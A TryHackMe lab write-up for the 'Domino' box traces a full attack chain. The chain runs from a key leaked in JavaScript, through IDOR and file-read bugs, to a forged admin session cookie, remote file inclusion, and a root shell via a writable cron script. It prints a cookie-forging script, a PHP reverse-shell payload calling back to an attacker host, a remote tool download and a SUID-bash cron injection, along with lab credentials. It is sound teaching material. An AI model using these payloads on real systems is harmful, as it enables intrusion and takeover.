# TryHackMe: Domino — Writeup

**Difficulty:** Medium
**Category:** Web Exploitation, IDOR, Session Forgery, RFI, Privilege Escalation
**Author:** Sabin (ninjax_11)
**Date:** July 2026

---

## Overview

Domino is a web focused CTF box built around a fictional company portal, "NexusCorp." What makes it a good learning box is that no single vulnerability is fatal on its own each small weakness hands you exactly the piece of information you need to attack the next layer. This writeup walks through the full chain step by step: **what I ran, why I ran it, how the command actually works, what it gave me back, and what that result told me to try next.**

Four flags are captured along the way. Their real values aren't shown, they're written as `THM{flag1}`, `THM{flag2}`, `THM{flag3}`, `THM{flag4}` as placeholders for wherever your own captured string goes.

---

## Table of Contents

1. [Reconnaissance — Finding What's Open](#1-reconnaissance--finding-whats-open)
2. [Enumeration — Mapping the Web App](#2-enumeration--mapping-the-web-app)
3. [Reading the Leaked JavaScript](#3-reading-the-leaked-javascript)
4. [Decrypting the Backup Config](#4-decrypting-the-backup-config)
5. [Flag 1 — Breaking Access Control (IDOR)](#5-flag-1--breaking-access-control-idor)
6. [Turning a File-Read Bug into a Secrets Leak](#6-turning-a-file-read-bug-into-a-secrets-leak)
7. [Flag 2 — Forging an Admin Session](#7-flag-2--forging-an-admin-session)
8. [Flag 3 — Turning File-Read into Code Execution](#8-flag-3--turning-file-read-into-code-execution)
9. [Moving Sideways — www-data to devops](#9-moving-sideways--www-data-to-devops)
10. [Flag 4 — Becoming Root via Cron](#10-flag-4--becoming-root-via-cron)
11. [Flags Summary](#11-flags-summary)
12. [Lessons Learned](#12-lessons-learned)

---

## 1. Reconnaissance — Finding What's Open

**Why I started here:** before touching anything, I need to know what's actually reachable on the box. There's no point guessing at web paths if, say, only SSH is open.

**Command:**
```bash
nmap -sC -sV <target_ip>
```

**How it works:**
- `-sC` runs Nmap's default set of safe enumeration scripts (banner grabs, common service checks).
- `-sV` probes each open port to identify the exact service and version running on it.
- Together, this single command tells me *what* is listening and *what software version* it's running, which sometimes reveals known CVEs by itself.

**Result:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
|_http-title: NexusCorp Portal
```

**What this tells me / what's next:** Only two ports are open. SSH (22) is almost never the *entry point* on a box like this — it's usually where you land *after* getting credentials some other way. So the entire initial attack surface is the web app on port 80. That's where I go next.

`![Screenshot: nmap scan results]`

---

## 2. Enumeration — Mapping the Web App

**Why I did this:** the homepage only shows me what the developers *want* me to see. Most real content — admin panels, backups, forgotten test files — lives at paths that aren't linked anywhere. The only way to find them is to guess systematically using a wordlist.

**Command:**
```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```

**How it works:**
- `dir` tells Gobuster to brute-force directory/file names.
- `-u` is the target URL.
- `-w` points at a wordlist of common directory/file names; Gobuster requests each one and reports back anything that isn't a 404.

**Result:**
```
admin        (Status: 301)
api          (Status: 301)
backup       (Status: 301)
static       (Status: 301)
support      (Status: 301)
```

**What this tells me / what's next:** `/admin/` and `/api/` are expected on a portal like this, but `/backup/` immediately stands out — backup directories are a classic case of "convenient for the sysadmin, forgotten about before going live." That's the first place I dig into.

Visiting `/backup/` shows a `README` file:

```
NexusCorp Backup Configuration
================================
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```

**Why this matters:** the README is telling me two things directly — there's an encrypted file (`config.enc`) I can download, and the decryption key is supposedly referenced somewhere in `static/app.js`. That's a direct pointer to my next move: go read that JS file.

`![Screenshot: /backup/README.txt contents]`

---

## 3. Reading the Leaked JavaScript

**Why I did this:** the README explicitly said the decryption key lives in `static/app.js`. Frontend JavaScript is sent in full to every visitor's browser, so anything in there — including any comments left by a developer — is effectively public, whether or not the developer meant for people to read it.

**Command:**
```bash
curl http://<target_ip>/static/app.js
```

**How it works:** a plain GET request, no authentication needed, since this file is served to every visitor of the site by design.

**Result:** a developer comment sitting directly in the file:

```js
// Encryption key for backup config decryption - AES-ECB-128
// Key: N3xusK3y2024!!  (pad to 16 bytes)
_backupKey: 'N3xusK3y2024!!'
```

**What this tells me / what's next:** I now have the AES key needed to decrypt `config.enc`. This is a textbook example of a secret that should have lived in a server-side environment variable, not in a file the browser downloads. Next step: actually decrypt the backup.

`![Screenshot: app.js source showing the leaked key]`

---

## 4. Decrypting the Backup Config

**Why I did this:** I now have both pieces needed — the encrypted file from `/backup/config.enc`, and the key from `app.js`. Time to combine them.

**Command:**
```bash
python3 -c "print('N3xusK3y2024!!'.encode().ljust(16, b'\x00').hex())"
openssl enc -aes-128-ecb -d -in config.enc -out config_decrypted -K <hex_key> -nopad
cat config_decrypted
```

**How it works:**
- AES-128-ECB needs a key that's exactly 16 bytes. The key string found in `app.js` is 14 characters, so it needs to be padded to 16 bytes — the small Python one-liner does that padding and converts the result to hex, which is the format `openssl` expects.
- `openssl enc -aes-128-ecb -d` decrypts the file using that key. `-nopad` is used because we're not sure the original encryption used standard PKCS7 padding, so we handle the raw output ourselves.

**Result:**
```json
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```

**What this tells me / what's next:** this doesn't hand me a working credential directly, but it does name a real system account — `devops` — that exists on the underlying server. That's a detail worth writing down; it becomes important much later, during privilege escalation. For now, the web app itself is still the main target, so I move on to testing its API.

`![Screenshot: decrypted config.enc contents]`

---

## 5. Flag 1 — Breaking Access Control (IDOR)

**Why I did this:** the app's `/api/` routes require a JWT (JSON Web Token) for authentication, obtainable from `/api/auth/token.php`. Once I had *any* valid token — even for a low-privileged account — the natural next question for any API is: **does the server check that I actually own the resource I'm asking for, or does it just check that my token is valid at all?** That distinction is the entire basis of an IDOR (Insecure Direct Object Reference) vulnerability, so it's always worth testing.

**Command:**
```bash
curl 'http://<target_ip>/api/users/profile.php?id=1' \
  -H 'Authorization: Bearer <my_own_jwt>'
```

**How it works:** I'm using my own valid, low-privilege token, but changing the `id` parameter in the URL to `1` — a guess that user ID 1 is likely the very first account created (often an admin, in seeded demo data like this).

**Result:**
```json
{
  "id": 1,
  "username": "laura.hayes",
  "email": "laura.hayes@nexus.corp",
  "role": "admin",
  "notes": "THM{flag1}"
}
```

**What this tells me / what's next:** the server never checked whether the `id` I asked for matched *my* account — it just checked that my token was valid *at all*. This confirms an IDOR: any authenticated user can pull any other user's profile by changing one number. It also tells me the admin account's username (`laura.hayes`), which becomes useful once I start trying to impersonate that account later.

**Flag 1:** `THM{flag1}`

`![Screenshot: profile.php?id=1 response containing flag 1]`

---

## 6. Turning a File-Read Bug into a Secrets Leak

**Why I did this:** the same `/api/` area exposes `files.php`, which reads a file from disk and returns its contents, given a `name` parameter and a valid JWT. Whenever an app hands you *any* kind of arbitrary file-read primitive, the highest-value targets are always the application's own source code and config files, because that's where its secrets live.

**Command:**
```bash
curl 'http://<target_ip>/api/files.php?name=/var/www/html/config.php' \
  -H 'Authorization: Bearer <jwt>'
```

**How it works:** `name` is passed straight through to whatever file-reading function the backend uses, with no restriction to a specific safe folder — so any path readable by the web server's user gets returned.

**Result:**
```json
{
  "file": "/var/www/html/config.php",
  "content": "<?php\ndefine('DB_PASS', 'D3v0ps!2024');\ndefine('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');\ndefine('APP_SECRET', 'nexus_app_k3y_2024');\n..."
}
```

**What this tells me / what's next:** this one request leaked three separate secrets — a database password, the JWT signing secret, and (critically) the `APP_SECRET` used to sign the site's session cookies. I also pulled `index.php` the same way, which showed exactly *how* the session cookie is built:

```php
$cookie_data = base64_encode(json_encode([
    'user_id' => $row['id'], 'username' => $row['username'], 'role' => $row['role']
]));
$sig = hash_hmac('sha256', $cookie_data, APP_SECRET);
setcookie('nexus_session', $cookie_data . '.' . $sig, ...);
```

The cookie is nothing more than `base64(json) + "." + HMAC-SHA256(json, APP_SECRET)` — there's no server-side session table backing it up. That means if I know `APP_SECRET`, I can build a valid cookie for *any* user entirely on my own machine, with zero further interaction with the server. That's exactly what the leaked secret now lets me do.

`![Screenshot: files.php leaking config.php]`

---

## 7. Flag 2 — Forging an Admin Session

**Why I did this:** I now have the exact ingredients the server itself uses to trust a session — the admin's user ID (from the IDOR in step 5) and the signing secret (from step 6). Rather than looking for a password, I can just construct a valid session myself.

**Command (Python):**
```python
import base64, hmac, hashlib, json

SECRET_KEY = b"nexus_app_k3y_2024"
user_payload = {"user_id": 1, "username": "laura.hayes", "role": "admin"}

json_str = json.dumps(user_payload, separators=(',', ':'))
base64_payload = base64.b64encode(json_str.encode()).decode()
signature = hmac.new(SECRET_KEY, base64_payload.encode(), hashlib.sha256).hexdigest()

forged_cookie = f"{base64_payload}.{signature}"
print(forged_cookie)
```

**How it works:** this recreates the exact same cookie-building logic seen in `index.php` — same JSON structure, same HMAC-SHA256 signing function, same secret key. Since I control every input, the server has no way to tell my forged cookie apart from one it issued itself.

**Result:** setting this value as the `nexus_session` cookie in the browser and visiting `/admin/index.php` loads the admin panel with full access.

```
THM{flag2}
```

**What this tells me / what's next:** I now have admin-level access to the app. Every earlier step — the leaked JS key, the decrypted backup, the IDOR, the file-read — existed purely to get me to this one secret. This is the "pivot point" of the whole box: once a signing secret leaks, authentication stops meaning anything.

**Flag 2:** `THM{flag2}`

`![Screenshot: forged cookie set in browser dev tools]`
`![Screenshot: admin panel access showing flag 2]`

---

## 8. Flag 3 — Turning File-Read into Code Execution

**Why I did this:** with admin access confirmed, I went back to `files.php` and tested one more thing — what happens if `name` is a full URL instead of a local path? A file-read endpoint that also fetches remote URLs is a Remote File Inclusion (RFI) risk, because if the fetched content is PHP, the server may execute it rather than just display it.

**Setup — start a listener and a small web server to host the payload:**
```bash
python3 -m http.server 8000
nc -lvnp 9001
```

**How it works:** the HTTP server hosts a PHP reverse-shell payload (`reverse.php`) so the target can fetch it; `nc -lvnp 9001` opens a listening socket on my machine so the payload has somewhere to connect back to once it executes.

**Trigger the RFI:**
```bash
curl 'http://<target_ip>/api/files.php?name=http://<attacker_ip>:8000/reverse.php' \
  -H 'Authorization: Bearer <admin_jwt>'
```

**Payload (`reverse.php`):**
```php
<?php
$sock = fsockopen("<attacker_ip>", 9001);
exec("sh <&3 >&3 2>&3");
```

**Result:** the netcat listener catches a shell:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**What this tells me / what's next:** the endpoint that was merely an information-disclosure bug in step 6 has now become full remote code execution, because it never restricted `name` to local, trusted paths. I have a working shell as `www-data` — a low-privileged web server account. Enumerating the filesystem from here turns up the third flag.

**Flag 3:** `THM{flag3}`

`![Screenshot: reverse shell landing as www-data]`
`![Screenshot: locating and reading flag 3 on disk]`

---

## 9. Moving Sideways — www-data to devops

**Why I did this:** `www-data` is a restricted service account — no real privileges, no useful home directory. Checking `/etc/passwd` confirmed a real interactive account exists: `devops` (the same name flagged back in step 4's decrypted backup). The database password leaked in step 6 (`D3v0ps!2024`) is a strong candidate to try here, since password reuse between an app's service credentials and a real system account is extremely common in practice.

**Command:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
su devops
```

**How it works:**
- The `pty.spawn` trick upgrades a raw netcat shell into a full interactive TTY — needed because `su` refuses to run properly without one.
- `su devops` then just attempts to switch to that user using the password I'm testing.

**Result:**
```
Password: D3v0ps!2024
whoami
devops
```

**What this tells me / what's next:** the password worked — confirming credential reuse between the database account and the real OS account. I'm now `devops`, a genuine user with a home directory. From here, the next logical move is looking for a path to root.

`![Screenshot: su to devops succeeding]`

---

## 10. Flag 4 — Becoming Root via Cron

**Why I did this:** as a normal, non-root user, I can't see other users' processes with plain `ps`, but scheduled (cron) jobs run periodically as whatever user owns them — often root — and `pspy` can observe that activity without needing any special privileges itself. Checking what root does on a schedule is one of the highest-value, lowest-cost privilege escalation checks available.

**Command:**
```bash
wget http://<attacker_ip>:8002/pspy64
chmod +x pspy64
./pspy64
```

**How it works:** `pspy` watches for new processes system-wide by polling `/proc`, so it catches short-lived cron jobs as they fire, printing the UID that launched them.

**Result:**
```
CMD: UID=0  PID=3133  | /bin/bash /opt/monitoring/health_report.sh
```

**What this tells me:** a script is being run by root (`UID=0`) on a schedule. The next question is automatic: **can I write to that file?**

**Command:**
```bash
ls -la /opt/monitoring/health_report.sh
```

Confirmed: writable by `devops`. That's the gap — a script executed with root's privileges, but editable by a low-privileged user.

**Exploiting it:**
```bash
echo 'chmod +s /bin/bash' >> /opt/monitoring/health_report.sh
```

**How it works:** appending this line means that the next time cron fires and root executes the script, it runs `chmod +s /bin/bash` *as root* — setting the SUID bit on `/bin/bash`, so that running `bash` afterwards executes with root's privileges regardless of who launches it.

**Result (after waiting for the cron interval to pass):**
```bash
ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.4M Mar 31 2024 /bin/bash

bash -p
id
uid=1001(devops) gid=1001(devops) euid=0(root)
```

**What this tells me:** `euid=0(root)` confirms an effective root shell. From here, reading the final flag is just:
```bash
cat /root/root.txt
```

**Flag 4 (root):** `THM{flag4}`

`![Screenshot: pspy64 catching the root cron job]`
`![Screenshot: SUID bash confirmed, root shell, and flag 4]`

---

## 11. Flags Summary

| # | Where it was found | How it was obtained |
|---|---|---|
| 1 | `profile.php?id=1` response | IDOR — no ownership check on the `id` parameter |
| 2 | Admin panel, `/admin/index.php` | Session cookie forged using the leaked `APP_SECRET` |
| 3 | Filesystem, as `www-data` | RFI via `files.php` fetching a remote PHP payload |
| 4 | `/root/root.txt` | Cron script writable by `devops`, executed as root |

`THM{flag1}` · `THM{flag2}` · `THM{flag3}` · `THM{flag4}`

---

## 12. Lessons Learned

- **Never hardcode secrets in client-side JavaScript.** Anything sent to the browser is public the moment it's downloaded.
- **Always check ownership, not just authentication**, on any endpoint that takes an object ID — a valid token is not the same as permission to view a specific record.
- **Never let a "read a file" endpoint accept remote URLs** without an explicit allow-list of safe local paths — that single gap is what turned an information leak into full RCE.
- **Session/JWT signing secrets must never appear in application source that could ever leak.** If they do, rotate them immediately.
- **Don't reuse the same password across a database account and a real system account.**
- **Any file executed by root via cron must not be writable by a lower-privileged user** — execution privilege and write privilege should never sit at different trust levels on the same file.

---

*Writeup for the TryHackMe "Domino" lab. Screenshots referenced throughout are stored in `./screenshots/` in this repo.*
